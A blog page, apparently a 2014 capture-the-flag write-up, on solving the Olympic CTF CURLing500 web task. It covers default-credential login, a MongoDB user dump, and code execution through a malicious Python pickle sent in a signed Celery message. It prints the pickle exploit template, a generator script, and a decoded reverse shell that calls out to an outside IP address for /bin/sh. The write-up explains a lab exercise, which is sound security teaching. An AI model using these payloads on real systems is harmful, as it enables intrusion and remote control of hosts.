@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Olympic CTF CURLing500 Write Up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.
+In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that admin was a valid user but we could not guess the password. After trying with other &amp;ldquo;normal&amp;rdquo; accounts like guest, dev and so on, we found that debug was a valid account and the password was debug.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Olympic CTF CURLing500 Write Up">
+    <meta name="twitter:description" content="We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.
+In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that admin was a valid user but we could not guess the password. After trying with other &amp;ldquo;normal&amp;rdquo; accounts like guest, dev and so on, we found that debug was a valid account and the password was debug.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Olympic CTF CURLing500 Write Up">
+  <meta property="og:description" content="We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.
+In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that admin was a valid user but we could not guess the password. After trying with other &amp;ldquo;normal&amp;rdquo; accounts like guest, dev and so on, we found that debug was a valid account and the password was debug.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/02/14/olympic-ctf-curling500-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/02/14/olympic-ctf-curling500-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Olympic CTF CURLing500 Write Up</h1>
+      <p class="post-meta">@pwntester · Feb 14, 2014 · 7 min read</p>
+    </header>
+    <article class="post-content"><p>We didnt have time to finish this task during the game since we decided to finish Freestyle 400 (scored in the last minute) but as I foound out later, we were close to finish it.</p>
+
+<p>In this level we were presented with a login form vulnerable to user enumeration. It was easy to see that <strong>admin</strong> was a valid user but we could not guess the password. After trying with other &ldquo;normal&rdquo; accounts like guest, dev and so on, we found that <strong>debug</strong> was a valid account and the password was <strong>debug</strong>. Nice, we were in.</p>
+
+<p>Then we were presented with a console to enter and run our code. Simple evaluations like &ldquo;1+1&rdquo; and &ldquo;&lsquo;some&rsquo;.concat(&lsquo;thing&rsquo;)&rdquo; worked. What gave us more details was entering &ldquo;help&rdquo;:</p>
+
+<pre><code class="language-lang-javascript">function (x) { if (x == &quot;mr&quot;) { print(&quot;\nSee also http://dochub.mongodb.org/core/mapreduce&quot;); print(&quot;\nfunction mapf() {&quot;); print(&quot; // 'this' holds current document to inspect&quot;); print(&quot; emit(key, value);&quot;); print(&quot;}&quot;); print(&quot;\nfunction reducef(key,value_array) {&quot;); print(&quot; return reduced_value;&quot;); print(&quot;}&quot;); print(&quot;\ndb.mycollection.mapReduce(mapf, reducef[, options])&quot;); print(&quot;\noptions&quot;); print(&quot;{[query : &lt;query filter object&gt;]&quot;); print(&quot; [, sort : &lt;sort the query. useful for optimization&gt;]&quot;); print(&quot; [, limit : &lt;number of objects to return from collection&gt;]&quot;); print(&quot; [, out : &lt;output-collection name&gt;]&quot;); print(&quot; [, keeptemp: &lt;true|false&gt;]&quot;); print(&quot; [, finalize : &lt;finalizefunction&gt;]&quot;); print(&quot; [, scope : &lt;object where fields go into javascript global scope &gt;]&quot;); print(&quot; [, verbose : true]}\n&quot;); return; } else if (x == &quot;connect&quot;) { print(&quot;\nNormally one specifies the server on the mongo shell command line. Run mongo --help to see those options.&quot;); print(&quot;Additional connections may be opened:\n&quot;); print(&quot; var x = new Mongo('host[:port]');&quot;); print(&quot; var mydb = x.getDB('mydb');&quot;); print(&quot; or&quot;); print(&quot; var mydb = connect('host[:port]/mydb');&quot;); print(&quot;\nNote: the REPL prompt only auto-reports getLastError() for the shell command line connection.\n&quot;); return; } else if (x == &quot;keys&quot;) { print(&quot;Tab completion and command history is available at the command prompt.\n&quot;); print(&quot;Some emacs keystrokes are available too:&quot;); print(&quot; Ctrl-A start of line&quot;); print(&quot; Ctrl-E end of line&quot;); print(&quot; Ctrl-K del to end of line&quot;); print(&quot;\nMulti-line commands&quot;); print(&quot;You can enter a multi line javascript expression. If parens, braces, etc. are not closed, you will see a new line &quot;); print(&quot;beginning with '...' characters. Type the rest of your expression. Press Ctrl-C to abort the data entry if you&quot;); print(&quot;get stuck.\n&quot;); } else if (x == &quot;misc&quot;) { print(&quot;\tb = new BinData(subtype,base64str) create a BSON BinData value&quot;); print(&quot;\tb.subtype() the BinData subtype (0..255)&quot;); print(&quot;\tb.length() length of the BinData data in bytes&quot;); print(&quot;\tb.hex() the data as a hex encoded string&quot;); print(&quot;\tb.base64() the data as a base 64 encoded string&quot;); print(&quot;\tb.toString()&quot;); print(); print(&quot;\tb = HexData(subtype,hexstr) create a BSON BinData value from a hex string&quot;); print(&quot;\tb = UUID(hexstr) create a BSON BinData value of UUID subtype&quot;); print(&quot;\tb = MD5(hexstr) create a BSON BinData value of MD5 subtype&quot;); print(&quot;\t\&quot;hexstr\&quot; string, sequence of hex characters (no 0x prefix)&quot;); print(); print(&quot;\to = new ObjectId() create a new ObjectId&quot;); print(&quot;\to.getTimestamp() return timestamp derived from first 32 bits of the OID&quot;); print(&quot;\to.isObjectId&quot;); print(&quot;\to.toString()&quot;); print(&quot;\to.equals(otherid)&quot;); print(); print(&quot;\td = ISODate() like Date() but behaves more intuitively when used&quot;); print(&quot;\td = ISODate('YYYY-MM-DD hh:mm:ss') without an explicit \&quot;new \&quot; prefix on construction&quot;); return; } else if (x == &quot;admin&quot;) { print(&quot;\tls([path]) list files&quot;); print(&quot;\tpwd() returns current directory&quot;); print(&quot;\tlistFiles([path]) returns file list&quot;); print(&quot;\thostname() returns name of this host&quot;); print(&quot;\tcat(fname) returns contents of text file as a string&quot;); print(&quot;\tremoveFile(f) delete a file or directory&quot;); print(&quot;\tload(jsfilename) load and execute a .js file&quot;); print(&quot;\trun(program[, args...]) spawn a program and wait for its completion&quot;); print(&quot;\trunProgram(program[, args...]) same as run(), above&quot;); print(&quot;\tsleep(m) sleep m milliseconds&quot;); print(&quot;\tgetMemInfo() diagnostic&quot;); return; } else if (x == &quot;test&quot;) { print(&quot;\tstartMongodEmpty(args) DELETES DATA DIR and then starts mongod&quot;); print(&quot;\t returns a connection to the new server&quot;); print(&quot;\tstartMongodTest(port,dir,options)&quot;); print(&quot;\t DELETES DATA DIR&quot;); print(&quot;\t automatically picks port #s starting at 27000 and increasing&quot;); print(&quot;\t or you can specify the port as the first arg&quot;); print(&quot;\t dir is /data/db/&lt;port&gt;/ if not specified as the 2nd arg&quot;); print(&quot;\t returns a connection to the new server&quot;); print(&quot;\tresetDbpath(dirpathstr) deletes everything under the dir specified including subdirs&quot;); print(&quot;\tstopMongoProgram(port[, signal])&quot;); return; } else if (x == &quot;&quot;) { print(&quot;\t&quot; + &quot;db.help() help on db methods&quot;); print(&quot;\t&quot; + &quot;db.mycoll.help() help on collection methods&quot;); print(&quot;\t&quot; + &quot;sh.help() sharding helpers&quot;); print(&quot;\t&quot; + &quot;rs.help() replica set helpers&quot;); print(&quot;\t&quot; + &quot;help admin administrative help&quot;); print(&quot;\t&quot; + &quot;help connect connecting to a db help&quot;); print(&quot;\t&quot; + &quot;help keys key shortcuts&quot;); print(&quot;\t&quot; + &quot;help misc misc things to know&quot;); print(&quot;\t&quot; + &quot;help mr mapreduce&quot;); print(); print(&quot;\t&quot; + &quot;show dbs show database names&quot;); print(&quot;\t&quot; + &quot;show collections show collections in current database&quot;); print(&quot;\t&quot; + &quot;show users show users in current database&quot;); print(&quot;\t&quot; + &quot;show profile show most recent system.profile entries with time &gt;= 1ms&quot;); print(&quot;\t&quot; + &quot;show logs show the accessible logger names&quot;); print(&quot;\t&quot; + &quot;show log [name] prints out the last segment of log in memory, 'global' is default&quot;); print(&quot;\t&quot; + &quot;use &lt;db_name&gt; set current database&quot;); print(&quot;\t&quot; + &quot;db.foo.find() list objects in collection foo&quot;); print(&quot;\t&quot; + &quot;db.foo.find( { a : 1 } ) list objects in foo where a == 1&quot;); print(&quot;\t&quot; + &quot;it result of the last line evaluated; use to further iterate&quot;); print(&quot;\t&quot; + &quot;DBQuery.shellBatchSize = x set default number of items to display on shell&quot;); print(&quot;\t&quot; + &quot;exit quit the mongo shell&quot;); } else print(&quot;unknown help option&quot;); }.
+</code></pre>
+
+<p>Nice, a bunch of useful information, specially the references to <strong>MongoDB</strong>. Since it seems that we were working we Mongo, we entered the following commands:</p>
+
+<pre><code class="language-lang-javascript">db.getMongo().getDBNames()
+         [u'admin', u'web500', u'local', u'flag', u'flags'].
+</code></pre>
+
+<pre><code class="language-lang-javascript">db.getCollectionNames()
+         [u'lulz', u'system.indexes', u'system.users', u'users'].
+</code></pre>
+
+<pre><code class="language-lang-javascript">db.users.findOne()
+         {u'login': u'debug', u'_id': ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'}.
+</code></pre>
+
+<pre><code class="language-lang-javascript">db.users.find().toArray()
+         [{u'login': u'debug', u'_id':  ObjectId('52f661f917c6f07b4987ec03'), u'pwd': u'debug'},
+         {u'login':  u'admin', u'_id': ObjectId('52f6623c17c6f07b4987ec04'), u'pwd':  u'firststeptoflag-done'}].
+</code></pre>
+
+<p>Pretty cool, now we have the admin credentials and can log in as administrator.</p>
+
+<p>When logged in as admin, we could see a form with two fields: a base64 encoded text and a signature to submit the base64 &ldquo;command&rdquo;:</p>
+
+<pre><code class="language-lang-bash">eyJib2R5IjogImdBSjljUUVvVlFkbGVIQnBjbVZ6Y1FKT1ZRTjFkR054QTRoVkJHRnlaM054QkVzWFN5cUdjUVZWQldOb2IzSmtjUVpPVlFsallXeHNZbUZqYTNOeEIwNVZDR1Z5Y21KaFkydHpjUWhPVlFkMFlYTnJjMlYwY1FsT1ZRSnBaSEVLVlNSaE0yUTVZems0Tmkxak5EWXhMVFExWmpBdE9UTm1ZUzA1WWpCbE9USTVZVEppTXpkeEMxVUhjbVYwY21sbGMzRU1Td0JWQkhSaGMydHhEVlVOWVhCd0xuUmxjM1JmZEdGemEzRU9WUWwwYVcxbGJHbHRhWFJ4RDA1T2hsVURaWFJoY1JCT1ZRWnJkMkZ5WjNOeEVYMXhFblV1IiwgImhlYWRlcnMiOiB7fSwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXB5dGhvbi1zZXJpYWxpemUiLCAicHJvcGVydGllcyI6IHsiYm9keV9lbmNvZGluZyI6ICJiYXNlNjQiLCAiY29ycmVsYXRpb25faWQiOiAiYTNkOWM5ODYtYzQ2MS00NWYwLTkzZmEtOWIwZTkyOWEyYjM3IiwgInJlcGx5X3RvIjogIjAxOTI1YTNmLTE3ZDUtM2YzYy1iMDg2LTZjNzFiZTBlMmI1MCIsICJkZWxpdmVyeV9pbmZvIjogeyJwcmlvcml0eSI6IDAsICJyb3V0aW5nX2tleSI6ICJjZWxlcnkiLCAiZXhjaGFuZ2UiOiAiY2VsZXJ5In0sICJkZWxpdmVyeV9tb2RlIjogMiwgImRlbGl2ZXJ5X3RhZyI6IDF9LCAiY29udGVudC1lbmNvZGluZyI6ICJiaW5hcnkifQ==
+</code></pre>
+
+<pre><code class="language-lang-bash">9ce5b4b977d4cdd5941dfad4da1b2c9fc47a35e3a68f80e43f3ea2145c694405
+</code></pre>
+
+<p>If we decode the command we got:</p>
+
+<pre><code class="language-lang-bash">{&quot;body&quot;: &quot;gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsXSyqGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSRhM2Q5Yzk4Ni1jNDYxLTQ1ZjAtOTNmYS05YjBlOTI5YTJiMzdxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUNYXBwLnRlc3RfdGFza3EOVQl0aW1lbGltaXRxD05OhlUDZXRhcRBOVQZrd2FyZ3NxEX1xEnUu&quot;, &quot;headers&quot;: {}, &quot;content-type&quot;: &quot;application/x-python-serialize&quot;, &quot;properties&quot;: {&quot;body_encoding&quot;: &quot;base64&quot;, &quot;correlation_id&quot;: &quot;a3d9c986-c461-45f0-93fa-9b0e929a2b37&quot;, &quot;reply_to&quot;: &quot;01925a3f-17d5-3f3c-b086-6c71be0e2b50&quot;, &quot;delivery_info&quot;: {&quot;priority&quot;: 0, &quot;routing_key&quot;: &quot;celery&quot;, &quot;exchange&quot;: &quot;celery&quot;}, &quot;delivery_mode&quot;: 2, &quot;delivery_tag&quot;: 1}, &quot;content-encoding&quot;: &quot;binary&quot;}
+</code></pre>
+
+<p>The content-type: x-python-serialize tell us that the body is some kind of serialized python code. If we decode it:</p>
+
+<pre><code class="language-lang-bash">}q(UexpiresqNUutcqUargsqKK*qUchordqNU    callbacksqNUerrbacksqNUtasksetq NUidq
+U$a3d9c986-c461-45f0-93fa-9b0e929a2b37q
+Uretriesq
+K
+</code></pre>
+
+<p>There was also a binary called <strong>signer-striped</strong> available for download. So it seems we can serialize our payload with pickle, sign it using the signer and submit the payload and the signature.</p>
+
+<p>The first problem is that the <strong>signer</strong> is a <strong>arm64</strong> binary:</p>
+
+<pre><code class="language-lang-bash">signer-striped: ELF 64-bit LSB executable, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.7.0, BuildID[sha1]=0xef4ad560b1f9a141560710535a904093212a8a22, stripped
+</code></pre>
+
+<p>We have to set up a chroot with qemu-arm64 to emulate the hardware and be able to run the signer. Now, lets go for the payload.</p>
+
+<p>This is as far as we got during the game since we didnt have time and decided to go for the Freestyle400 one. I tried to solve it but the CTF VMs are down so the rest is just how I think the task was solved based on the <a href="http://pastebin.com/ygn11B1p">request</a> posted by <a href="https://twitter.com/maciekkotowicz">@maciekkotowicz</a> in the IRC channel. I decided to post this entry since there are no write-ups in the web and the last part was interesting.</p>
+
+<p>The request posted in pastebin can be decoded to:</p>
+
+<pre><code class="language-lang-bash">{&quot;body&quot;: &quot;Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFGQUFBQUF3QUFBRU1BQUFCem1BQUFBSFFBQUdRQkFJTUJBSDBBQUhRQUFHUUNBSU1CQUgwQkFIUUFBR1FEQUlNQkFIMENBSHdBQUdvQkFJTUFBSDBEQUh3REFHb0NBR1FMQUlNQkFBRjhBZ0JxQXdCOEF3QnFCQUNEQUFCa0JnQ0RBZ0FCZkFJQWFnTUFmQU1BYWdRQWd3QUFaQWNBZ3dJQUFYd0NBR29EQUh3REFHb0VBSU1BQUdRSUFJTUNBQUY4QVFCcUJRQmtDUUJrQ2dCbkFnQ0RBUUI5QkFCa0FBQlRLQXdBQUFCT2RBWUFBQUJ6YjJOclpYUjBDZ0FBQUhOMVluQnliMk5sYzNOMEFnQUFBRzl6Y3d3QUFBQTVOQzR5TXk0eU1URXVPREpwT0JBQUFHa0FBQUFBYVFFQUFBQnBBZ0FBQUhNSEFBQUFMMkpwYmk5emFITUNBQUFBTFdrb0FnQUFBSE1NQUFBQU9UUXVNak11TWpFeExqZ3lhVGdRQUFBb0JnQUFBSFFLQUFBQVgxOXBiWEJ2Y25SZlgxSUFBQUFBZEFjQUFBQmpiMjV1WldOMGRBUUFBQUJrZFhBeWRBWUFBQUJtYVd4bGJtOTBCQUFBQUdOaGJHd29CUUFBQUhRQ0FBQUFjM04wQWdBQUFITndVZ0lBQUFCMEFRQUFBSE4wQVFBQUFIQW9BQUFBQUNnQUFBQUFjd2tBQUFBdmRHMXdMM2N1Y0hsMEF3QUFBSEIzYmdRQUFBQnpFZ0FBQUFBQkRBRU1BUXdCREFBTkFSWUFGZ0FXQVE9PScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=&quot;, &quot;headers&quot;: {}, &quot;content-type&quot;: &quot;application/x-python-serialize&quot;, &quot;properties&quot;: {&quot;body_encoding&quot;: &quot;base64&quot;, &quot;correlation_id&quot;: &quot;a3d9c986-c461-45f0-93fa-9b0e929a2b37&quot;, &quot;reply_to&quot;: &quot;01925a3f-17d5-3f3c-b086-6c71be0e2b50&quot;, &quot;delivery_info&quot;: {&quot;priority&quot;: 10, &quot;routing_key&quot;: &quot;celery&quot;, &quot;exchange&quot;: &quot;celery&quot;}, &quot;delivery_mode&quot;: 2, &quot;delivery_tag&quot;: 1}, &quot;content-encoding&quot;: &quot;binary&quot;}
+</code></pre>
+
+<p>We can see that the server accepted the same correlation_id, reply_to and delivery_info. If we decode the body:</p>
+
+<pre><code class="language-lang-bash">ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S'YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ=='
+tRtRc__builtin__
+globals
+(tRS''
+tR(tR.
+</code></pre>
+
+<p>This is easily recognozible as pickle serialized data and actually is a know template to execute code via pickle deserialization. You can find a nice post describing how does it work <a href="www.cs.jhu.edu/~s/musings/pickle.html">here</a>, but basically what will be execute is the python code object (got via function.func_code) encoded with base64.</p>
+
+<p>In order to generate the payload we can use the following python script:</p>
+
+<pre><code class="language-lang-python">import marshal
+import base64
+
+def foo():
+    pass # PAYLOAD HERE
+
+print &quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S'%s'
+tRtRc__builtin__
+globals
+(tRS''
+tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))
+</code></pre>
+
+<p>We can reverse the process to figure out what was the payload used:</p>
+
+<pre><code class="language-lang-python">import marshal
+import base64
+
+payload = &quot;YwAAAAAFAAAAAwAAAEMAAABzmAAAAHQAAGQBAIMBAH0AAHQAAGQCAIMBAH0BAHQAAGQDAIMBAH0CAHwAAGoBAIMAAH0DAHwDAGoCAGQLAIMBAAF8AgBqAwB8AwBqBACDAABkBgCDAgABfAIAagMAfAMAagQAgwAAZAcAgwIAAXwCAGoDAHwDAGoEAIMAAGQIAIMCAAF8AQBqBQBkCQBkCgBnAgCDAQB9BABkAABTKAwAAABOdAYAAABzb2NrZXR0CgAAAHN1YnByb2Nlc3N0AgAAAG9zcwwAAAA5NC4yMy4yMTEuODJpOBAAAGkAAAAAaQEAAABpAgAAAHMHAAAAL2Jpbi9zaHMCAAAALWkoAgAAAHMMAAAAOTQuMjMuMjExLjgyaTgQAAAoBgAAAHQKAAAAX19pbXBvcnRfX1IAAAAAdAcAAABjb25uZWN0dAQAAABkdXAydAYAAABmaWxlbm90BAAAAGNhbGwoBQAAAHQCAAAAc3N0AgAAAHNwUgIAAAB0AQAAAHN0AQAAAHAoAAAAACgAAAAAcwkAAAAvdG1wL3cucHl0AwAAAHB3bgQAAABzEgAAAAABDAEMAQwBDAANARYAFgAWAQ==&quot;
+p1 = base64.b64decode(payload);
+p2 = marshal.loads(p1);
+print p2.co_consts
+</code></pre>
+
+<pre><code class="language-lang-bash">(None, 'socket', 'subprocess', 'os', '94.23.211.82', 4152, 0, 1, 2, '/bin/sh', '-i', ('94.23.211.82', 4152))
+</code></pre>
+
+<p>This looks like a reverse shell, so we can guess the payload function was something like:</p>
+
+<pre><code class="language-lang-bash">def pwn():
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((&quot;94.23.211.821&quot;,4152))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+</code></pre>
+
+<p>According to <a href="https://twitter.com/maciekkotowicz/status/434804205912465409">@maciekkotowicz</a>, once you got the shell you had to look for the flag in a RedisDB, but I didnt get the chance to try that.</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/web"><span class="tag">Web</span></a></li>
+        
+          <li><a href="/tags/olympic"><span class="tag">Olympic</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2078</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
